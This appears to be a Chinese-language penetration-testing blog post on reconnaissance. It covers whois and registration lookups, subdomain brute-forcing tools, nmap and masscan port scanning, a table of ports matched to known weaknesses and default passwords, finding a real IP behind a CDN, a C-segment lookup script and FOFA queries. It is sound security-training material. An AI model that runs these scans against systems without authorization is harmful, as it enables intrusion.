          <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="1-whois-查询"><a href="#1-whois-查询" class="headerlink" title="1. whois 查询"></a>1. whois 查询</h2><h3 id="1-1-在线-whois-查询"><a href="#1-1-在线-whois-查询" class="headerlink" title="1.1 在线 whois 查询"></a>1.1 在线 whois 查询</h3><p>通过whois来对域名信息进行查询，可以查到注册商、注册人、邮箱、DNS解析服务器、注册人联系电话等，因为有些网站信息查得到，有些网站信息查不到，所以推荐以下信息比较全的查询网站，直接输入目标站点即可查询到相关信息。<br>站长之家域名WHOIS信息查询地址 <a target="_blank" rel="noopener" href="http://whois.chinaz.com/">http://whois.chinaz.com/</a>  <a target="_blank" rel="noopener" href="http://whois.chinaz.com/">站长之家</a></p>
<p>爱站网域名WHOIS信息查询地址 <a target="_blank" rel="noopener" href="https://whois.aizhan.com/">https://whois.aizhan.com/</a>   <a target="_blank" rel="noopener" href="https://whois.aizhan.com/">爱站网</a></p>
<p>腾讯云域名WHOIS信息查询地址 <a target="_blank" rel="noopener" href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a>    <a target="_blank" rel="noopener" href="https://whois.cloud.tencent.com/">腾讯云</a></p>
<p>美橙互联域名WHOIS信息查询地址 <a target="_blank" rel="noopener" href="https://whois.cndns.com/">https://whois.cndns.com/</a>  <a target="_blank" rel="noopener" href="https://whois.cndns.com/">美橙互联</a></p>
<p>爱名网域名WHOIS信息查询地址 <a target="_blank" rel="noopener" href="https://www.22.cn/domain/">https://www.22.cn/domain/</a>   <a target="_blank" rel="noopener" href="https://www.22.cn/domain/">爱名网</a></p>
<p>易名网域名WHOIS信息查询地址 <a target="_blank" rel="noopener" href="https://whois.ename.net/">https://whois.ename.net/</a>    <a target="_blank" rel="noopener" href="https://whois.ename.net/">易名网</a></p>
<p>中国万网域名WHOIS信息查询地址 <a target="_blank" rel="noopener" href="https://whois.aliyun.com/">https://whois.aliyun.com/</a>     <a target="_blank" rel="noopener" href="https://whois.aliyun.com/">中国万网</a></p>
<p>西部数码域名WHOIS信息查询地址 <a target="_blank" rel="noopener" href="https://whois.west.cn/">https://whois.west.cn/</a>    <a target="_blank" rel="noopener" href="https://whois.west.cn/">西部数码</a></p>
<p>新网域名WHOIS信息查询地址 <a target="_blank" rel="noopener" href="http://whois.xinnet.com/domain/whois/index.jsp">http://whois.xinnet.com/domain/whois/index.jsp</a>    <a target="_blank" rel="noopener" href="http://whois.xinnet.com/domain/whois/index.jsp">新网</a></p>
<p>纳网域名WHOIS信息查询地址 <a target="_blank" rel="noopener" href="http://whois.nawang.cn/">http://whois.nawang.cn/</a>   <a target="_blank" rel="noopener" href="http://whois.nawang.cn/">纳网</a></p>
<p>中资源域名WHOIS信息查询地址 <a target="_blank" rel="noopener" href="https://www.zzy.cn/domain/whois.html">https://www.zzy.cn/domain/whois.html</a>    <a target="_blank" rel="noopener" href="https://www.zzy.cn/domain/whois.html">中资源</a></p>
<p>三五互联域名WHOIS信息查询地址 <a target="_blank" rel="noopener" href="https://cp.35.com/chinese/whois.php">https://cp.35.com/chinese/whois.php</a>   <a target="_blank" rel="noopener" href="https://cp.35.com/chinese/whois.php">三五互联</a></p>
<p>新网互联域名WHOIS信息查询地址 <a target="_blank" rel="noopener" href="http://www.dns.com.cn/show/domain/whois/index.do">http://www.dns.com.cn/show/domain/whois/index.do</a>  <a target="_blank" rel="noopener" href="http://www.dns.com.cn/show/domain/whois/index.do">新网互联</a></p>
<p>国外WHOIS信息查询地址 <a target="_blank" rel="noopener" href="https://who.is/">https://who.is/</a>   <a target="_blank" rel="noopener" href="https://who.is/">国外WHOIS</a></p>
<h3 id="1-2-在线网站备案查询"><a href="#1-2-在线网站备案查询" class="headerlink" title="1.2 在线网站备案查询"></a>1.2 在线网站备案查询</h3><p>网站备案信息是根据国家法律法规规定，由网站所有者向国家有关部门申请的备案，如果需要查询企业备案信息（单位名称、备案编号、网站负责人、电子邮箱、联系电话、法人等），推荐以下网站查询<br>天眼查 <a target="_blank" rel="noopener" href="https://www.tianyancha.com/">https://www.tianyancha.com/</a>              <a target="_blank" rel="noopener" href="https://www.tianyancha.com/">天眼查</a><br>ICP备案查询网 <a target="_blank" rel="noopener" href="http://www.beianbeian.com/">http://www.beianbeian.com/</a>        <a target="_blank" rel="noopener" href="http://www.beianbeian.com/">ICP备案查询网</a><br>爱站备案查询 <a target="_blank" rel="noopener" href="https://icp.aizhan.com/">https://icp.aizhan.com/</a>            <a target="_blank" rel="noopener" href="https://icp.aizhan.com/">爱站备案查询</a><br>域名助手备案信息查询 <a target="_blank" rel="noopener" href="http://cha.fute.com/index">http://cha.fute.com/index</a>   <a target="_blank" rel="noopener" href="http://cha.fute.com/index">域名助手备案信息查询</a>    </p>
<h2 id="2-收集子域名"><a href="#2-收集子域名" class="headerlink" title="2. 收集子域名"></a>2. 收集子域名</h2><h3 id="2-1-子域名作用"><a href="#2-1-子域名作用" class="headerlink" title="2.1 子域名作用"></a>2.1 子域名作用</h3><p>收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 <em>直接输入domain</em></p>
<h3 id="2-1-2-如何检测CNAME记录"><a href="#2-1-2-如何检测CNAME记录" class="headerlink" title="2.1.2 如何检测CNAME记录"></a>2.1.2 如何检测CNAME记录</h3><ol>
<li>进入命令状态；（开始菜单 - 运行 - CMD[回车]）；</li>
<li>输入命令” nslookup -q=cname 这里填写对应的域名或二级域名”，查看返回的结果与设置的是否一致即可。 <h3 id="2-2常用方式"><a href="#2-2常用方式" class="headerlink" title="2.2常用方式"></a>2.2常用方式</h3>子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城，其他管理系统，网站管理后台也有可能出现子域名中。<br>首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。<h3 id="子域名在线查询"><a href="#子域名在线查询" class="headerlink" title="子域名在线查询"></a>子域名在线查询</h3><a target="_blank" rel="noopener" href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a> <a target="_blank" rel="noopener" href="https://phpinfo.me/domain/"></a><br><a target="_blank" rel="noopener" href="https://www.t1h2ua.cn/tools/">https://www.t1h2ua.cn/tools/</a>   <a target="_blank" rel="noopener" href="https://www.t1h2ua.cn/tools/"></a><h3 id="dns侦测"><a href="#dns侦测" class="headerlink" title="dns侦测"></a>dns侦测</h3><a target="_blank" rel="noopener" href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> <a target="_blank" rel="noopener" href="https://dnsdumpster.com/"></a><h3 id="ip138-查询子域名"><a href="#ip138-查询子域名" class="headerlink" title="ip138 查询子域名"></a>ip138 查询子域名</h3><a target="_blank" rel="noopener" href="https://site.ip138.com/moonsec.com/domain.htm">https://site.ip138.com/moonsec.com/domain.htm</a> <a target="_blank" rel="noopener" href="https://site.ip138.com/moonsec.com/domain.htm"></a><h3 id="Hackertarget查询子域名"><a href="#Hackertarget查询子域名" class="headerlink" title="Hackertarget查询子域名"></a>Hackertarget查询子域名</h3><a target="_blank" rel="noopener" href="https://hackertarget.com/find-dns-host-records/">https://hackertarget.com/find-dns-host-records/</a> <a target="_blank" rel="noopener" href="https://hackertarget.com/find-dns-host-records/"></a><br><em>注意：通过该方法查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息</em><h3 id="360-Quake"><a href="#360-Quake" class="headerlink" title="360 Quake"></a>360 Quake</h3><a target="_blank" rel="noopener" href="https://quake.360.cn/">https://quake.360.cn/</a><br>domain:”*.???.com”<h4 id="Layer子域名挖掘机"><a href="#Layer子域名挖掘机" class="headerlink" title="Layer子域名挖掘机"></a>Layer子域名挖掘机</h4></li>
</ol>
<hr>
<h3 id="Layer子域名挖掘机-1"><a href="#Layer子域名挖掘机-1" class="headerlink" title="Layer子域名挖掘机"></a>Layer子域名挖掘机</h3><h3 id="SubDomainBrute"><a href="#SubDomainBrute" class="headerlink" title="SubDomainBrute"></a>SubDomainBrute</h3><p><a target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a> <a target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute">SubDomainBrute</a><br><code>pip install aiodns</code><br>运行命令<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">subDomainsBrute.py freebuf.com  </span><br><span class="line">subDomainsBrute.py  freebuf.com --full -o freebuf2.txt</span><br></pre></td></tr></table></figure></p>
<h3 id="Sublist3r"><a href="#Sublist3r" class="headerlink" title="Sublist3r"></a>Sublist3r</h3><p><a target="_blank" rel="noopener" href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br><code>pip install -r requirements.txt</code><br><em>提示：以上方法为爆破子域名，由于字典比较强大，所以效率较高。</em><br>帮助文档<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">usage: sublist3r.py [-h] -d DOMAIN [-b [BRUTEFORCE]] [-p PORTS] [-v [VERBOSE]]</span><br><span class="line">                    [-t THREADS] [-e ENGINES] [-o OUTPUT] [-n]</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -d DOMAIN, --domain DOMAIN</span><br><span class="line">                        Domain name to enumerate it&#x27;s subdomains</span><br><span class="line">  -b [BRUTEFORCE], --bruteforce [BRUTEFORCE]</span><br><span class="line">                        Enable the subbrute bruteforce module</span><br><span class="line">  -p PORTS, --ports PORTS</span><br><span class="line">                        Scan the found subdomains against specified tcp ports</span><br><span class="line">  -v [VERBOSE], --verbose [VERBOSE]</span><br><span class="line">                        Enable Verbosity and display results in realtime</span><br><span class="line">  -t THREADS, --threads THREADS</span><br><span class="line">                        Number of threads to use for subbrute bruteforce</span><br><span class="line">  -e ENGINES, --engines ENGINES</span><br><span class="line">                        Specify a comma-separated list of search engines</span><br><span class="line">  -o OUTPUT, --output OUTPUT</span><br><span class="line">                        Save the results to text file</span><br><span class="line">  -n, --no-color        Output without color</span><br></pre></td></tr></table></figure><br>Example: python sublist3r.py -d google.com</p>
<p>中文翻译<br>-h ：帮助<br>-d ：指定主域名枚举子域名<br>-b ：调用subbrute暴力枚举子域名<br>-p ：指定tpc端口扫描子域名<br>-v ：显示实时详细信息结果<br>-t ：指定线程<br>-e ：指定搜索引擎<br>-o ：将结果保存到文本<br>-n ：输出不带颜色 </p>
<p>默认参数扫描子域名<br><code>python sublist3r.py -d baidu.com</code></p>
<p>使用暴力枚举子域名<br><code>python sublist3r -b -d baidu.com</code></p>
<h3 id="OneForALL-kali"><a href="#OneForALL-kali" class="headerlink" title="OneForALL (kali)"></a>OneForALL (kali)</h3><p>pip3 install —user -r requirements.txt -i <a target="_blank" rel="noopener" href="https://mirrors.aliyun.com/pypi/simple/`">https://mirrors.aliyun.com/pypi/simple/`</a><br>python3 oneforall.py —target baidu.com run /<em>收集</em>/<br>爆破子域名<br>Example：<br>brute.py —target domain.com —word True run<br>brute.py —targets ./domains.txt —word True run<br>brute.py —target domain.com —word True —concurrent 2000 run<br>brute.py —target domain.com —word True —wordlist subnames.txt run<br>brute.py —target domain.com —word True —recursive True —depth 2 run<br>brute.py —target d.com —fuzz True —place m.<em>.d.com —rule ‘[a-z]’ run<br>brute.py —target d.com —fuzz True —place m.</em>.d.com —fuzzlist subnames.txt run</p>
<h3 id="FuzzDomain"><a href="#FuzzDomain" class="headerlink" title="FuzzDomain"></a>FuzzDomain</h3><h2 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3. 端口扫描"></a>3. 端口扫描</h2><p>当确定了目标大概的ip段后，可以先对ip的开放端口进行探测，一些特定服务可能开起在默认端口上，探测开放端口有利于快速收集目标资产，找到目标网站的其他功能站点。</p>
<h3 id="msscan端口扫描-kali"><a href="#msscan端口扫描-kali" class="headerlink" title="msscan端口扫描  (kali)"></a>msscan端口扫描  (kali)</h3><p><a target="_blank" rel="noopener" href="https://gitee.com/youshusoft/GoScanner/">https://gitee.com/youshusoft/GoScanner/</a> <a target="_blank" rel="noopener" href="https://gitee.com/youshusoft/GoScanner/"></a><br><code>msscan -p 1-65535 ip --rate=1000</code></p>
<h3 id="御剑端口扫描-holdsword"><a href="#御剑端口扫描-holdsword" class="headerlink" title="御剑端口扫描 holdsword"></a>御剑端口扫描 holdsword</h3><h3 id="nmap扫描端口和探测端口信息"><a href="#nmap扫描端口和探测端口信息" class="headerlink" title="nmap扫描端口和探测端口信息"></a>nmap扫描端口和探测端口信息</h3><p>常用参数，如：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.0.2</span><br><span class="line">nmap -sT 92.168.0.2</span><br><span class="line">nmap -Pn -A -sC 192.168.0.2</span><br><span class="line">nmap -sU -sT -p0-65535 192.168.122.1</span><br></pre></td></tr></table></figure><br>sU—UDP     sT—TCP<br>用于扫描目标主机服务版本号与开放的端口</p>
<p>如果需要扫描多个ip或ip段，可以将他们保存到一个txt文件中<br>nmap -iL ip.txt<br>来扫描列表中所有的ip。<br>Nmap为端口探测最常用的方法，操作方便，输出结果非常直观。</p>
<h3 id="在线端口检测"><a href="#在线端口检测" class="headerlink" title="在线端口检测"></a>在线端口检测</h3><p><a target="_blank" rel="noopener" href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a> <a target="_blank" rel="noopener" href="http://coolaf.com/tool/port"></a></p>
<h3 id="端口扫描器"><a href="#端口扫描器" class="headerlink" title="端口扫描器"></a>端口扫描器</h3><p>御剑，msscan，zmap</p>
<h3 id="渗透端口"><a href="#渗透端口" class="headerlink" title="渗透端口"></a>渗透端口</h3><p>21,22,23,1433,152,3306,3389,5432,5900,50070,50030,50000,27017,27018,11211,9200,9300,7001,7002,6379,5984,873,443,8000-9090,80-89,80,10000,8888,8649,8083,8080,8089,9090,7778,7001,7002,6082,5984,4440,3312,3311,3128,2601,2604,2222,2082,2083,389,88,512,513,514,1025,111,1521,445,135,139,53</p>
<h3 id="渗透常见端口及对应服务"><a href="#渗透常见端口及对应服务" class="headerlink" title="渗透常见端口及对应服务"></a>渗透常见端口及对应服务</h3><h4 id="1-web类-web漏洞-敏感目录"><a href="#1-web类-web漏洞-敏感目录" class="headerlink" title="1.web类(web漏洞/敏感目录)"></a>1.web类(web漏洞/敏感目录)</h4><p>第三方通用组件漏洞struts thinkphp jboss ganglia zabbix<br>80 web<br>80-89 web<br>8000-9090 web</p>
<h4 id="2-数据库类-扫描弱口令"><a href="#2-数据库类-扫描弱口令" class="headerlink" title="2.数据库类(扫描弱口令)"></a>2.数据库类(扫描弱口令)</h4><p>1433 MSSQL<br>1521 Oracle<br>3306 MySQL<br>5432 PostgreSQL </p>
<h4 id="3-特殊服务类-未授权-命令执行类-漏洞"><a href="#3-特殊服务类-未授权-命令执行类-漏洞" class="headerlink" title="3.特殊服务类(未授权/命令执行类/漏洞)"></a>3.特殊服务类(未授权/命令执行类/漏洞)</h4><p>443 SSL心脏滴血<br>873 Rsync未授权<br>5984 CouchDB <a target="_blank" rel="noopener" href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a><br>6379 redis未授权<br>7001,7002 WebLogic默认弱口令，反序列<br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>11211 memcache未授权访问<br>27017,27018 Mongodb未授权访问<br>50000 SAP命令执行<br>50070,50030 hadoop默认端口未授权访问</p>
<h4 id="4-常用端口类-扫描弱口令-端口爆破"><a href="#4-常用端口类-扫描弱口令-端口爆破" class="headerlink" title="4.常用端口类(扫描弱口令/端口爆破)"></a>4.常用端口类(扫描弱口令/端口爆破)</h4><p>21 ftp<br>22 SSH<br>23 Telnet<br>2601,2604 zebra路由，默认密码zebra<br>3389 远程桌面</p>
<h4 id="5-端口合计详情"><a href="#5-端口合计详情" class="headerlink" title="5.端口合计详情"></a>5.端口合计详情</h4><p>21 ftp<br>22 SSH<br>23 Telnet<br>80 web<br>80-89 web<br>161 SNMP<br>389 LDAP<br>443 SSL心脏滴血以及一些web漏洞测试<br>445 SMB </p>
<p>512,513,514 Rexec<br>873 Rsync未授权<br>1025,111 NFS<br>1433 MSSQL<br>1521 Oracle:(iSqlPlus Port:5560,7778)<br>2082/2083 cpanel主机管理系统登陆 （国外用较多）<br>2222 DA虚拟主机管理系统登陆 （国外用较多）<br>2601,2604 zebra路由，默认密码zebra<br>3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了<br>3306 MySQL<br>3312/3311 kangle主机管理系统登陆<br>3389 远程桌面<br>4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网<br>5432 PostgreSQL<br>5900 vnc<br>5984 CouchDB <a target="_blank" rel="noopener" href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a><br>6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网<br>6379 redis未授权<br>7001,7002 WebLogic默认弱口令，反序列<br>7778 Kloxo主机控制面板登录<br>8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上<br>8080 tomcat/WDCP主机管理系统，默认弱口令<br>8080,8089,9090 JBOSS<br>8083 Vestacp主机管理系统 （国外用较多）<br>8649 ganglia<br>8888 amh/LuManager 主机管理系统默认端口<br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>10000 Virtualmin/Webmin 服务器虚拟主机管理系统<br>11211 memcache未授权访问<br>27017,27018 Mongodb未授权访问<br>28017 mongodb统计页面<br>50000 SAP命令执行<br>50070,50030 hadoop默认端口未授权访问</p>
<h3 id="常见的端口和攻击方法"><a href="#常见的端口和攻击方法" class="headerlink" title="常见的端口和攻击方法"></a>常见的端口和攻击方法</h3><p><img src="/image/常见端口攻击方法.png" alt="常见的端口和攻击方法"></p>
<h2 id="4-查找真实ip"><a href="#4-查找真实ip" class="headerlink" title="4.查找真实ip"></a>4.查找真实ip</h2><h3 id="4-1-多地ping确认是否使用CDN"><a href="#4-1-多地ping确认是否使用CDN" class="headerlink" title="4.1 多地ping确认是否使用CDN"></a>4.1 多地ping确认是否使用CDN</h3><p><a target="_blank" rel="noopener" href="http://ping.chinaz.com/">http://ping.chinaz.com/</a>     <a target="_blank" rel="noopener" href="http://ping.chinaz.com/"></a><br><a target="_blank" rel="noopener" href="http://ping.aizhan.com/">http://ping.aizhan.com/</a>     <a target="_blank" rel="noopener" href="http://ping.aizhan.com/"></a></p>
<h3 id="4-2-查询历史DNS解析记录"><a href="#4-2-查询历史DNS解析记录" class="headerlink" title="4.2 查询历史DNS解析记录"></a>4.2 查询历史DNS解析记录</h3><p>在查询到的历史解析记录中，最早的历史解析ip很有可能记录的就是真实ip，快速查找真实IP推荐此方法，但并不是所有网站都能查到</p>
<h4 id="4-2-1-DNSDB"><a href="#4-2-1-DNSDB" class="headerlink" title="4.2.1 DNSDB"></a>4.2.1 DNSDB</h4><p><a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> <a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/"></a></p>
<h4 id="4-2-2-微步在线"><a href="#4-2-2-微步在线" class="headerlink" title="4.2.2 微步在线"></a>4.2.2 微步在线</h4><p><a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> <a target="_blank" rel="noopener" href="https://x.threatbook.cn/"></a></p>
<h4 id="4-2-3-Ipip-net"><a href="#4-2-3-Ipip-net" class="headerlink" title="4.2.3 Ipip.net"></a>4.2.3 Ipip.net</h4><p><a target="_blank" rel="noopener" href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a> <a target="_blank" rel="noopener" href="https://tools.ipip.net/cdn.php"></a></p>
<h4 id="4-2-4-iewdns"><a href="#4-2-4-iewdns" class="headerlink" title="4.2.4 iewdns"></a>4.2.4 iewdns</h4><p><a target="_blank" rel="noopener" href="https://viewdns.info/">https://viewdns.info/</a> <a target="_blank" rel="noopener" href="https://viewdns.info/"></a></p>
<h3 id="4-3-phpinfo"><a href="#4-3-phpinfo" class="headerlink" title="4.3 phpinfo"></a>4.3 phpinfo</h3><p>如果目标网站存在phpinfo泄露等，可以在phpinfo中的SERVER_ADDR或_SERVER[“SERVER_ADDR”]找到真实ip</p>
<h3 id="4-4-绕过CDN"><a href="#4-4-绕过CDN" class="headerlink" title="4.4 绕过CDN"></a>4.4 绕过CDN</h3><p>绕过CDN的多种方法具体可以参考<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/qiudabai/p/9763739.html">https://www.cnblogs.com/qiudabai/p/9763739.html</a> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/qiudabai/p/9763739.html">绕过CDN</a></p>
<h2 id="5-旁站和C段"><a href="#5-旁站和C段" class="headerlink" title="5 旁站和C段"></a>5 旁站和C段</h2><p>旁站往往存在业务功能站点，建议先收集已有IP的旁站，再探测C段，确认C段目标后，再在C段的基础上再收集一次旁站。</p>
<p>旁站是和已知目标站点在同一服务器但不同端口的站点，通过以下方法搜索到旁站后，先访问一下确定是不是自己需要的站点信息。</p>
<h3 id="5-1-google-hacking"><a href="#5-1-google-hacking" class="headerlink" title="5.1 google hacking"></a>5.1 google hacking</h3><p><code>https://blog.csdn.net/qq_36119192/article/details/84029809</code></p>
<h4 id="5-1-1-网络空间搜索引擎"><a href="#5-1-1-网络空间搜索引擎" class="headerlink" title="5.1.1 网络空间搜索引擎"></a>5.1.1 网络空间搜索引擎</h4><p>如FOFA搜索旁站和C段<br>该方法效率较高，并能够直观地看到站点标题，但也有不常见端口未收录的情况，虽然这种情况很少，但之后补充资产的时候可以用下面的方法nmap扫描再收集一遍。<br><em>shodan</em></p>
<h4 id="5-1-2-在线c段-webscan-cc"><a href="#5-1-2-在线c段-webscan-cc" class="headerlink" title="5.1.2 在线c段 webscan.cc"></a>5.1.2 在线c段 webscan.cc</h4><p>webscan.cc<br><a target="_blank" rel="noopener" href="https://c.webscan.cc/">https://c.webscan.cc/</a>   <a target="_blank" rel="noopener" href="https://c.webscan.cc/">webscan.cc</a></p>
<h4 id="5-1-3-c段-利用脚本"><a href="#5-1-3-c段-利用脚本" class="headerlink" title="5.1.3 c段 利用脚本"></a>5.1.3 c段 利用脚本</h4><p>pip install requests<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">def get_c(ip):</span><br><span class="line">    print(&quot;正在收集&#123;&#125;&quot;.format(ip))</span><br><span class="line">    url=&quot;http://api.webscan.cc/?action=query&amp;ip=&#123;&#125;&quot;.format(ip)</span><br><span class="line">    req=requests.get(url=url)</span><br><span class="line">    html=req.text</span><br><span class="line">    data=req.json()</span><br><span class="line">    if &#x27;null&#x27; not in html:</span><br><span class="line">        with open(&quot;resulit.txt&quot;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">            f.write(ip + &#x27;\n&#x27;)</span><br><span class="line">            f.close()</span><br><span class="line">        for i in data:</span><br><span class="line">            with open(&quot;resulit.txt&quot;, &#x27;a&#x27;,encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">                f.write(&quot;\t&#123;&#125; &#123;&#125;\n&quot;.format(i[&#x27;domain&#x27;],i[&#x27;title&#x27;]))</span><br><span class="line">                print(&quot;     [+] &#123;&#125; &#123;&#125;[+]&quot;.format(i[&#x27;domain&#x27;],i[&#x27;title&#x27;]))</span><br><span class="line">                f.close()</span><br><span class="line"></span><br><span class="line">def get_ips(ip):</span><br><span class="line">    iplist=[]</span><br><span class="line">    ips_str = ip[:ip.rfind(&#x27;.&#x27;)]</span><br><span class="line">    for ips in range(1, 256):</span><br><span class="line">        ipadd=ips_str + &#x27;.&#x27; + str(ips)</span><br><span class="line">        iplist.append(ipadd)</span><br><span class="line">    return iplist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip=input(&quot;请你输入要查询的ip:&quot;)</span><br><span class="line"></span><br><span class="line">ips=get_ips(ip)</span><br><span class="line">for p in ips:</span><br><span class="line">    get_c(p)</span><br></pre></td></tr></table></figure></p>
<h3 id="5-1-4-Nmap-Msscan扫描等"><a href="#5-1-4-Nmap-Msscan扫描等" class="headerlink" title="5.1.4 Nmap,Msscan扫描等"></a>5.1.4 Nmap,Msscan扫描等</h3><p><code>nmap -p 80,443,8000,8080 -Pn 192.168.0.0/24</code></p>
<h3 id="5-站长之家-接口不稳定"><a href="#5-站长之家-接口不稳定" class="headerlink" title="5.? 站长之家 (接口不稳定)"></a>5.? 站长之家 (接口不稳定)</h3><p>同ip网站查询<br><a target="_blank" rel="noopener" href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a><br><a target="_blank" rel="noopener" href="https://chapangzhan.com/">https://chapangzhan.com/</a></p>
<h2 id="6-网络空间搜索引擎"><a href="#6-网络空间搜索引擎" class="headerlink" title="6. 网络空间搜索引擎"></a>6. 网络空间搜索引擎</h2><p>如果想要在短时间内快速收集资产，那么利用网络空间搜索引擎是不错的选择，可以直观地看到旁站，端口，站点标题，IP等信息，点击列举出站点可以直接访问，以此来判断是否为自己需要的站点信息。FOFA的常用语法</p>
<ol>
<li>同IP旁站：ip=”192.168.0.1”</li>
<li>C段：ip=”192.168.0.0/24”</li>
<li>子域名：domain=”baidu.com”</li>
<li>标题/关键字：title=”百度”</li>
<li>如果需要将结果缩小到某个城市的范围，那么可以拼接语句<br><code>title=&quot;百度&quot;&amp;&amp; region=&quot;Beijing&quot;</code></li>
<li>特征：body=”百度”或header=”baidu”</li>
</ol>
<h2 id="7-扫描敏感目录-文件"><a href="#7-扫描敏感目录-文件" class="headerlink" title="7. 扫描敏感目录/文件"></a>7. 扫描敏感目录/文件</h2><p>扫描敏感目录需要强大的字典，需要平时积累，拥有强大的字典能够更高效地找出网站的管理后台，敏感文件常见的如.git文件泄露，.svn文件泄露，phpinfo泄露等，这一步一半交给各类扫描器就可以了，将目标站点输入到域名中，选择对应字典类型，就可以开始扫描了，十分方便。</p>
<h3 id="7-1-御剑"><a href="#7-1-御剑" class="headerlink" title="7.1 御剑"></a>7.1 御剑</h3><p><a target="_blank" rel="noopener" href="https://www.fujieace.com/hacker/tools/yujian.html">https://www.fujieace.com/hacker/tools/yujian.html</a> <a target="_blank" rel="noopener" href="https://www.fujieace.com/hacker/tools/yujian.html">御剑</a></p>
<h3 id="7-2-7kbstorm"><a href="#7-2-7kbstorm" class="headerlink" title="7.2 7kbstorm"></a>7.2 7kbstorm</h3><p><a target="_blank" rel="noopener" href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a> <a target="_blank" rel="noopener" href="https://github.com/7kbstorm/7kbscan-WebPathBrute">7kbstorm</a></p>
<h3 id="7-3-bbscan-py2-7"><a href="#7-3-bbscan-py2-7" class="headerlink" title="7.3 bbscan (py2.7)"></a>7.3 bbscan (py2.7)</h3><p><a target="_blank" rel="noopener" href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>在pip已经安装的前提下，可以直接：<br>pip install -r requirements.txt<br>使用示例：</p>
<ol>
<li>扫描单个web服务 www.target.com<br> python BBScan.py  —host www.target.com</li>
<li>扫描www.target.com和www.target.com/28下的其他主机<br> python BBScan.py  —host www.target.com —network 28 </li>
<li>扫描txt文件中的所有主机<br> python BBScan.py -f wandoujia.com.txt</li>
<li>从文件夹中导入所有的主机并扫描<br> python BBScan.py -d targets/<br><code>–network</code> 参数用于设置子网掩码，小公司设为28~30，中等规模公司设置26~28，大公司设为24~26<br>当然，尽量避免设为24，扫描过于耗时，除非是想在各SRC多刷几个漏洞。<br>该插件是从内部扫描器中抽离出来的.</li>
</ol>
<p>如果你有非常有用的规则，请找几个网站验证测试后，再 pull request<br>脚本还会优化，接下来的事:</p>
<p>增加有用规则，将规则更好地分类，细化<br>后续可以直接从 rules\request 文件夹中导入HTTP_request<br>优化扫描逻辑</p>
<h3 id="7-4-dirmap-kali"><a href="#7-4-dirmap-kali" class="headerlink" title="7.4 dirmap  (kali)"></a>7.4 dirmap  (kali)</h3><p>pip install -r requirement.txt</p>
